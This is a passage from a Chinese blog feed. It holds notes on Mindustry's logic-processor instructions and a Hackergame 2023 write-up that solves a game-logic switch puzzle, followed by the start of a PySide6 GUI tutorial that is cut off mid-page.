      <url>/posts/35d972d0ed87/</url>
      
        <content type="html"><![CDATA[<p>因为这次Hackergame2023涉及到了这款游戏，所以特地学习一下里面的逻辑系统</p><p>本文章为b站系列视频<strong>【Mindustry】逻辑入门</strong>的笔记</p><p>下面是该视频传送门</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.bilibili.com/video/BV1rb4y1z7Zm" title="【Mindustry】逻辑入门" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/2023-10-2-cover0.webp" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="【Mindustry】逻辑入门" />              </div>              <div class="flink-item-name">【Mindustry】逻辑入门</div>               <div class="flink-item-desc" title="本期介绍指令：Get Link, Jump, End">本期介绍指令：Get Link, Jump, End</div>            </a>          </div></div></div><h2 id="变量和关键字"><a href="#变量和关键字" class="headerlink" title="变量和关键字"></a>变量和关键字</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="手动链接的自动命名"><a href="#手动链接的自动命名" class="headerlink" title="手动链接的自动命名"></a>手动链接的自动命名</h4><p>当我们<strong>修建一个处理器后</strong>，就可以<strong>单击旁边的方块进行手动链接</strong></p><p>方块上<strong>会被自动设置变量名</strong></p><img src="/posts/35d972d0ed87/image-20231102153452230.png" class="" title="image-20231102153452230"><p>我们可以在处理器中使用变量名指代这些方块</p><div class="note warning flat"><p>变量名一旦设置好，就<strong>无法修改</strong></p></div><h4 id="根据链接的排序使用Get-Link指令命名"><a href="#根据链接的排序使用Get-Link指令命名" class="headerlink" title="根据链接的排序使用Get Link指令命名"></a>根据链接的排序使用Get Link指令命名</h4><p>使用<code>Get Link</code>指令，我们可以根据链接顺序给方块<strong>手动命名</strong></p><img src="/posts/35d972d0ed87/image-20231102154808805.png" class="" title="image-20231102154808805"><p>例如此处，我们将第一个链接的命名为x1变量，第二个命名为x2</p><h4 id="指令执行过程中的赋值"><a href="#指令执行过程中的赋值" class="headerlink" title="指令执行过程中的赋值"></a>指令执行过程中的赋值</h4><p>我们也可以使用变量名去记录指令执行过程中的各种运行结果值</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>游戏中的各种关键字都以<code>@</code>符号开头</p><p>各种单位以及方块的名字都有对应的关键字</p><p>除了具体物件，还有以下其他常用关键字</p><div class="table-container"><table><thead><tr><th style="text-align:center">关键词名称</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">@time</td><td style="text-align:center">1970年至当前时间点经过的毫秒数</td></tr><tr><td style="text-align:center">@x</td><td style="text-align:center">（某物体的）x坐标</td></tr><tr><td style="text-align:center">@y</td><td style="text-align:center">（某物体的）y坐标</td></tr><tr><td style="text-align:center">@this</td><td style="text-align:center">处理器自身</td></tr><tr><td style="text-align:center">@thisx</td><td style="text-align:center">处理器自身的x坐标</td></tr><tr><td style="text-align:center">@thisy</td><td style="text-align:center">处理器自身的y坐标</td></tr><tr><td style="text-align:center">@unit</td><td style="text-align:center">当前所链接的单位</td></tr></tbody></table></div><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>Mindustry中的指令为<strong>顺序执行</strong>，且到达末尾后会从头开始，循环往复</p><h3 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h3><h4 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h4><p><code>Jump</code>指令用于跳转到另一个指令</p><p><code>Jump</code>指令会自带一个if的判断条件，如果为True，则执行<code>Jump</code></p><p>在游戏中，<strong>可以从<code>Jump</code>后拖出一个箭头</strong>，用来指向跳转的目标指令</p><h4 id="End"><a href="#End" class="headerlink" title="End"></a>End</h4><p><code>End</code>指令用于<strong>跳过后续指令</strong>，立即返回开头执行</p><h4 id="Sensor"><a href="#Sensor" class="headerlink" title="Sensor"></a>Sensor</h4><p><strong>Sensor</strong>用于从建筑或单位中获取数据</p><p>该指令的语法格式为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = @state <span class="keyword">in</span> target</span><br></pre></td></tr></table></figure><p>其中result为用于记录取出的状态信息结果的变量</p><p>@state用于指定目标的某个状态</p><p>target用于指定目标</p><p>此处<strong>状态关键字</strong>可以选的内容非常多</p><img src="/posts/35d972d0ed87/image-20231102171628035-16989165888081.png" class="" title="image-20231102171628035"><p>下面是一些关键字，省略了和战斗相关的</p><div class="table-container"><table><thead><tr><th>关键字名称</th><th>含义</th></tr></thead><tbody><tr><td>totalItems</td><td>储存物品的总量</td></tr><tr><td>totalLiquids</td><td>液体总量</td></tr><tr><td>totalPower</td><td>目标存储的电量</td></tr><tr><td>PowerNetIn</td><td>目标所在电网的发电量</td></tr><tr><td>ammo</td><td>弹药量</td></tr><tr><td>process</td><td>工厂、钻头等的进度</td></tr><tr><td>timescale</td><td>超速程度</td></tr><tr><td>enable</td><td>目标的开关状态</td></tr><tr><td>config</td><td>目标的选项，常用于分类器或装卸器</td></tr></tbody></table></div><h4 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h4><p><strong>Control</strong>指令用于控制元件状态</p><p>该指令的语法格式为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @state of target</span><br><span class="line">具体参数</span><br></pre></td></tr></table></figure><p>其中@state用于指定目标的某个状态</p><p>target用于指定目标</p><p>不同的状态拥有不同的参数格式</p><p>这里需要用到的是enable和config两个状态</p><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><p><strong>set</strong>用于给变量赋值，<strong>可以将变量赋给变量</strong></p><h4 id="Operation"><a href="#Operation" class="headerlink" title="Operation"></a>Operation</h4><p><strong>operation</strong>对变量进行数值计算的操作</p><h3 id="指令界面操作"><a href="#指令界面操作" class="headerlink" title="指令界面操作"></a>指令界面操作</h3><p>通过<strong>拖动指令</strong>，我们可以很方便地<strong>改变指令执行顺序</strong></p><p>单击复制按钮会立刻在该指令下方复制一个相同的指令</p><h2 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h2><h3 id="文字信息"><a href="#文字信息" class="headerlink" title="文字信息"></a>文字信息</h3><p><strong>信息板</strong>可以用来显示输出的文字消息</p><p><code>print</code>指令用于输出字符串、数字、关键字或者变量</p><p>而<code>print Flush</code>用于选择输出目标</p><p><code>print</code>中传入的字符串需要使用双引号<code>&quot;&quot;</code>包裹</p><p>这两个指令的运行逻辑是，执行<code>print</code>指令会将输出内容暂时存储到缓冲中</p><p>而<code>print Flush</code>则会将当前存储的所有内容都输出出来，并清空缓冲空间</p><h3 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h3><p><strong>逻辑显示屏</strong>可以用于输出图像</p><p>相关指令为<code>Draw</code>和<code>Draw Flush</code></p><p>具体的绘图参数就不做介绍了，因为在Hackergame中的题目中没有涉及</p><h2 id="简单逻辑"><a href="#简单逻辑" class="headerlink" title="简单逻辑"></a>简单逻辑</h2><h3 id="开关控制元件"><a href="#开关控制元件" class="headerlink" title="开关控制元件"></a>开关控制元件</h3><p>流程图：</p><img src="/posts/35d972d0ed87/image-20231102224118177.png" class="" title="image-20231102224118177"><p>简化后的流程图：</p><img src="/posts/35d972d0ed87/image-20231102224145943.png" class="" title="image-20231102224145943"><h2 id="Hackergame2023-异星歧途"><a href="#Hackergame2023-异星歧途" class="headerlink" title="Hackergame2023 异星歧途"></a>Hackergame2023 异星歧途</h2><p>整个地图的概览如下</p><img src="/posts/35d972d0ed87/image-20231102224957113.png" class="" title="image-20231102224957113"><p>我们需要控制红框中的那些开关，使得各个部分正常工作</p><h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>首先看第一部分</p><p>这一段的工作元件如下图所示</p><img src="/posts/35d972d0ed87/image-20231102225853873.png" class="" title="image-20231102225853873"><p>运输过来的煤炭给火力发电机供电，进而产生电力，电力则通过电线传输给下一部分</p><p>查看该微型处理器以及其链接的方块</p><img src="/posts/35d972d0ed87/image-20231102225838443.png" class="" title="image-20231102225838443"><p>该火力发电机受到微型处理器的控制，命名为<code>generator1</code>，同时开关<code>switch1</code>到<code>switch8</code>也在控制范围内</p><p>微处理器中的命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sensor s1 switch1 @enabled</span><br><span class="line">sensor s2 switch2 @enabled</span><br><span class="line">sensor s3 switch3 @enabled</span><br><span class="line">sensor s4 switch4 @enabled</span><br><span class="line">sensor s5 switch5 @enabled</span><br><span class="line">sensor s6 switch6 @enabled</span><br><span class="line">sensor s7 switch7 @enabled</span><br><span class="line">sensor s8 switch8 @enabled</span><br><span class="line">jump 18 equal s1 false</span><br><span class="line">jump 18 equal s2 true</span><br><span class="line">jump 18 equal s3 false</span><br><span class="line">jump 18 equal s4 true</span><br><span class="line">jump 18 equal s5 true</span><br><span class="line">jump 18 equal s6 false</span><br><span class="line">jump 18 equal s7 true</span><br><span class="line">jump 18 equal s8 false</span><br><span class="line">control enabled generator1 1 0 0 0</span><br><span class="line">end</span><br><span class="line">control enabled generator1 0 0 0 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>目标是让generator1的enable状态置为1</p><p>而前面这些jump语句都会跳到18，导致generator1的enable状态为0</p><p>所以我们就需要<strong>使得这些jump的判断条件为False</strong></p><p>此时开关s1到s8的值应该置为<code>10100101</code></p><div class="note success flat"><p>成功工作！</p></div><img src="/posts/35d972d0ed87/image-20231102230505530.png" class="" title="image-20231102230505530"><h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>接下来看第二部分</p><img src="/posts/35d972d0ed87/image-20231102231041420.png" class="" title="image-20231102231041420"><p>很显然，抽水机和涡轮发电机需要同时工作，进而产生电力并传给下一部分</p><img src="/posts/35d972d0ed87/image-20231102231107734.png" class="" title="image-20231102231107734"><p>我们需要使panell和generator1的enable置为1</p><p>查看逻辑处理器的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">sensor sw1 switch1 @enabled</span><br><span class="line">sensor sw2 switch2 @enabled</span><br><span class="line">sensor sw3 switch3 @enabled</span><br><span class="line">sensor sw4 switch4 @enabled</span><br><span class="line">sensor sw5 switch5 @enabled</span><br><span class="line">sensor sw6 switch6 @enabled</span><br><span class="line">sensor sw7 switch7 @enabled</span><br><span class="line">sensor sw8 switch8 @enabled</span><br><span class="line">op shl t sw1 7</span><br><span class="line">set number t</span><br><span class="line">op shl t sw2 6</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw3 5</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw4 4</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw5 3</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw6 2</span><br><span class="line">op add number number t</span><br><span class="line">op shl t sw7 1</span><br><span class="line">op add number number t</span><br><span class="line">set t sw8</span><br><span class="line">op add number number t</span><br><span class="line">set en 0</span><br><span class="line">set i 0</span><br><span class="line">jump 33 greaterThanEq i 16</span><br><span class="line">op pow fl0 i 2</span><br><span class="line">jump 31 notEqual fl0 number</span><br><span class="line">set en 1</span><br><span class="line">jump 33 always x false</span><br><span class="line">op add i i 1</span><br><span class="line">jump 26 always x false</span><br><span class="line">op equal fl1 0 sw1</span><br><span class="line">op equal fl2 0 sw6</span><br><span class="line">op or fl3 fl1 fl2</span><br><span class="line">jump 38 equal fl3 0</span><br><span class="line">set en 0</span><br><span class="line">control enabled generator1 en 0 0 0</span><br><span class="line">control enabled panel1 en 0 0 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们需要将其翻译为更通俗易懂的python语言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">switchs = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(switchs):</span><br><span class="line">    t = switchs[i]&lt;&lt;(<span class="number">7</span>-i)</span><br><span class="line">    number += t</span><br><span class="line">en = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">16</span>):</span><br><span class="line">    fl0 = i^<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> fl0 != number:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    en = <span class="number">1</span></span><br><span class="line">fl1 = (<span class="number">0</span>==switchs[<span class="number">0</span>])</span><br><span class="line">fl2 = (<span class="number">0</span>==switchs[<span class="number">5</span>])</span><br><span class="line">fl3 = fl1 <span class="keyword">or</span> fl2</span><br><span class="line"><span class="keyword">if</span> fl3 ==<span class="number">0</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success!&quot;</span>)</span><br></pre></td></tr></table></figure><p>那么我们需要满足两个条件：<code>en = 1</code>且<code>fl3!=0</code></p><p>前一个条件决定了<strong>number为一个平方数</strong>，而后一个条件则限制了<strong>sw1和sw6必须均为1</strong></p><p>这里我们可以使用爆破脚本找到满足条件的开关序列</p><div class="note warning flat"><p>需要注意的是switch8也在右侧的处理器范围内，一旦置为1，右侧模块则会爆炸</p></div><img src="/posts/35d972d0ed87/image-20231102234514724.png" class="" title="image-20231102234514724"><p>我们可以为该部分编写如下爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;01&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(dic, repeat=<span class="number">8</span>):</span><br><span class="line">    switchs = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line">    number = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        t = <span class="built_in">int</span>(switchs[i]) &lt;&lt; (<span class="number">7</span> - i)</span><br><span class="line">        number += t</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(number,<span class="number">2</span>)[<span class="number">1</span>] \</span><br><span class="line">            <span class="keyword">and</span> gmpy2.iroot(number,<span class="number">2</span>)[<span class="number">0</span>]!=<span class="number">0</span> \</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">int</span>(switchs[<span class="number">0</span>])==<span class="number">1</span> \</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">int</span>(switchs[<span class="number">5</span>])==<span class="number">1</span> \</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">int</span>(switchs[<span class="number">7</span>])==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(switchs)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><div class="note success flat"><p>得到正确序列<code>11000100</code></p></div><img src="/posts/35d972d0ed87/image-20231102235137304.png" class="" title="image-20231102235137304"><h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3><p>接下来是第三部分</p><p>本段的结构更为复杂，需要我们深入理解工作原理才行</p><img src="/posts/35d972d0ed87/image-20231103000346836.png" class="" title="image-20231103000346836"><img src="/posts/35d972d0ed87/image-20231103000425438.png" class="" title="image-20231103000425438"><p>想要恢复电力，我们需要让<strong>反应堆1和2运作起来</strong>，也就是reactor1和2的enable需要置为1</p><p>但是反应堆需要散热，否则会爆炸</p><p>而散热则需要满足两个条件：<strong>冷冻液混合器工作</strong>且<strong>冷冻液原料和水能够运输到冷冻液混合器</strong>，同时<strong>冷冻液和水不会分流浪费</strong></p><p>翻译为元件状态则是<strong>mixer1、extractor1和gate1的enable置为1</strong>，<strong>分流导管condult1和condult2的enable置为0</strong></p><p><strong>gate1为反溢流门，所以应该置为0</strong></p><p>最后反应堆也需要原料钍，所以<strong>conveyor2的enable设为1</strong></p><p>而那两天飞机则可有可无</p><p>我们再来看处理器内的指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sensor sw1 switch1 @enabled</span><br><span class="line">sensor sw2 switch2 @enabled</span><br><span class="line">sensor sw3 switch3 @enabled</span><br><span class="line">sensor sw4 switch4 @enabled</span><br><span class="line">sensor sw5 switch5 @enabled</span><br><span class="line">sensor sw6 switch6 @enabled</span><br><span class="line">sensor sw7 switch7 @enabled</span><br><span class="line">sensor sw8 switch8 @enabled</span><br><span class="line">sensor sw9 switch9 @enabled</span><br><span class="line">control enabled conveyor2 sw1 0 0 0</span><br><span class="line">control enabled gate1 sw2 0 0 0</span><br><span class="line">op equal nsw3 sw3 0</span><br><span class="line">control enabled reactor1 nsw3 0 0 0</span><br><span class="line">control enabled reactor2 nsw3 0 0 0</span><br><span class="line">control enabled conduit1 sw4 0 0 0</span><br><span class="line">control enabled conduit2 sw4 0 0 0</span><br><span class="line">control enabled mixer1 sw5 0 0 0</span><br><span class="line">control enabled extractor1 sw6 0 0 0</span><br><span class="line">control enabled meltdown1 sw7 0 0 0</span><br><span class="line">control enabled meltdown2 sw7 0 0 0</span><br><span class="line">op equal result sw8 sw9</span><br><span class="line">jump 28 equal result true</span><br><span class="line">control enabled mixer1 0 0 0 0</span><br><span class="line">control enabled conduit2 1 0 0 0</span><br><span class="line">control enabled reactor1 1 0 0 0</span><br><span class="line">control enabled reactor2 1 0 0 0</span><br><span class="line">control enabled conveyor2 1 0 0 0</span><br><span class="line">wait 5</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>sw1为1，sw2为0，nsw3为1，则sw3为0</p><p>sw4为0，sw5wei1，sw6为1，sw7为1</p><p>Jump的条件需要满足，所以result为True，sw8为0</p><p>此时序列为<code>10001110</code></p><div class="note success flat"><p>正常工作！s</p></div><img src="/posts/35d972d0ed87/image-20231103003014476.png" class="" title="image-20231103003014476"><h3 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h3><p>最后一部分则类似于一个迷宫，需要我们找到一个正确的电力传输路径</p><img src="/posts/35d972d0ed87/image-20231103004055387.png" class="" title="image-20231103004055387"><p>乍一看，我们能找到这题红色路径，接下来就是思考如何让路径上的节点工作</p><p>首先是switch3和4，他们置为1能让下图中框住的部分联通</p><img src="/posts/35d972d0ed87/image-20231103004245840.png" class="" title="image-20231103004245840"><p>接下来我们需要让下图中标红的线路工作</p><img src="/posts/35d972d0ed87/image-20231103005141437.png" class="" title="image-20231103005141437"><p>要想让红星的火力发电机工作，就需要<strong>关闭焚化炉3</strong></p><p>而焚化炉3被涡轮发动机控制，所以需要<strong>关闭涡轮发动机</strong>，此时控制两个煤炭能源旁的溢流门即可</p><p><strong>打开焚化炉2和4</strong>就能让涡轮发电机关闭，而这需要关闭焚化炉1</p><p>所以switch1为0，switch2为1</p><p>下面该思考如何连通下图的电路</p><img src="/posts/35d972d0ed87/image-20231103005559302.png" class="" title="image-20231103005559302"><img src="/posts/35d972d0ed87/image-20231103010027107.png" class="" title="image-20231103010027107"><p>我们需要<strong>关闭焚化炉3</strong>，即切断其旁边电力节点的电源</p><p>这需要我们<strong>打开焚化炉1、2和4</strong>，即<strong>swtich6、7、8均为1</strong></p><p>此时开关序列为<code>01110111</code></p><div class="note success flat"><p>成功通电！</p></div><img src="/posts/35d972d0ed87/image-20231103010251178.png" class="" title="image-20231103010251178"><p>最终总的开关序列为<code>10100101110001001000110001110111</code></p><p>启动反应堆，并从提交网站获得flag</p><img src="/posts/35d972d0ed87/image-20231103010723295.png" class="" title="image-20231103010723295"><img src="/posts/35d972d0ed87/image-20231103081137524.png" class="" title="image-20231103081137524">]]></content>
      
      
      <categories>
          
          <category> Hackergame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackergame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3 pyside6学习笔记及实践（一）</title>
      <link href="/posts/ebc439ef19b2/"/>
      <url>/posts/ebc439ef19b2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列文章为b站PySide6教程以及官方文档的学习笔记</p><p>原视频传送门如下</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.bilibili.com/video/BV1c84y1N7iL" title="【已完结】PySide6百炼成真，带你系统性入门Qt" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/a0589121b678174899c451c1a47538260e1b6e70.jpg@320w_200h_1c_!web-space-favlist-video.webp" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="【已完结】PySide6百炼成真，带你系统性入门Qt" />              </div>              <div class="flink-item-name">【已完结】PySide6百炼成真，带你系统性入门Qt</div>               <div class="flink-item-desc" title="祝大家百炼成真，早日做出自己心仪的界面">祝大家百炼成真，早日做出自己心仪的界面</div>            </a>          </div></div></div><p>官方文档链接：<a href="https://doc.qt.io/qtforpython-6/">Qt for Python</a></p><h2 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h2><p>我们来实现一个最简单的窗口，并借由其代码来初步认识pyside6的结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app =QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure><p>首先是导入的<code>QApplication</code>和<code>QMainWindow</code>类，这些类是用于创建 GUI 应用程序的基本类。</p><p>然后我们从<code>QMainWindow</code>类继承我们自己的窗口类<code>Mywindow</code>，这个类将用于创建应用程序的主窗口，此时类中只调用了父类的构造函数。</p><p>主程序中则创建了<code>QApplication</code>和<code>MyWindow</code>类的实例，QApplication 是一个必需的类，它管理应用程序的控制流和主要设置。</p><p><code>window.show()</code>用于显示MyWindow 实例，这将使窗口可见并允许用户与它进行交互</p><p><code>app.exec()</code>用于启动应用程序的事件循环。事件循环是一个无限循环，它等待用户输入和系统事件，并相应地更新应用程序的状态。</p><p>这段代码的运行效果如下</p><img src="/posts/ebc439ef19b2/image-20231027113850877.png" class="" title="image-20231027113850877"><h2 id="基础控件"><a href="#基础控件" class="headerlink" title="基础控件"></a>基础控件</h2><p>一般来说一个应用程序的运行逻辑无非是用户输入-&gt;用户交互-&gt;输出</p><p>那么这就涉及到三种最基本的控件：<strong>按钮、标签和输入框</strong></p><p>想要给窗体添加控件，需要<strong>在窗体类的构造函数中添加控件实例</strong></p><h3 id="QPushButton"><a href="#QPushButton" class="headerlink" title="QPushButton"></a>QPushButton</h3><p>该控件需要从<code>PySide6.QtWidgets</code>导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QPushButton</span><br><span class="line">btn = QPushButton(<span class="string">&quot;Click me&quot;</span>, self)</span><br></pre></td></tr></table></figure><p>但是光一个控件肯定不行，我们还需要设置它的一些属性，来满足高级需求</p><p>事实上，当我们想了解一个控件有<strong>哪些属性</strong>，以及这些属性分别有什么功能时，可以在<strong>Qt Designer</strong>上进行测试</p><p>当我们配置好vscode中的扩展插件PYQT Integration后，只需在文件上右键就能快速打开Qt Designer</p><img src="/posts/ebc439ef19b2/image-20231028102850285.png" class=""><p>我们只需拖动一个部件到窗体上，即可在右侧窗口查看并调试它的一些属性</p><img src="/posts/ebc439ef19b2/image-20231028103034636.png" class="" title="image-20231028103034636"><p>这里列出几个PushButton常用的属性</p><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">geometry（几何）</td><td style="text-align:center">坐标位置、尺寸大小</td></tr><tr><td style="text-align:center">text</td><td style="text-align:center">按钮上显示的文字</td></tr><tr><td style="text-align:center">toolTip</td><td style="text-align:center">鼠标放在按钮上时显示的提示文字</td></tr></tbody></table></div><div class="note warning flat"><p>想要为控件实例设置属性，需要调用<code>set+属性名</code>的方法</p></div><p>如下示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QMainWindow, QPushButton</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        btn = QPushButton(<span class="string">&quot;Click me&quot;</span>, self)</span><br><span class="line">        btn.setGeometry(<span class="number">100</span>, <span class="number">100</span>, <span class="number">200</span>, <span class="number">50</span>) <span class="comment">#设置(x,y)坐标为(100,100)，而宽高分别为200和50</span></span><br><span class="line">        btn.setText(<span class="string">&quot;new text&quot;</span>) <span class="comment">#重新设置的文字会覆盖初始化时的文字</span></span><br><span class="line">        btn.setToolTip(<span class="string">&quot;tips&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="QLabel"><a href="#QLabel" class="headerlink" title="QLabel"></a>QLabel</h3><p>该控件需要从<code>PySide6.QtWidgets</code>导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QLable</span><br><span class="line">lb = QLable(<span class="string">&quot;Hello&quot;</span>, self)</span><br></pre></td></tr></table></figure><p>下面是一些常用的标签特有属性</p><div 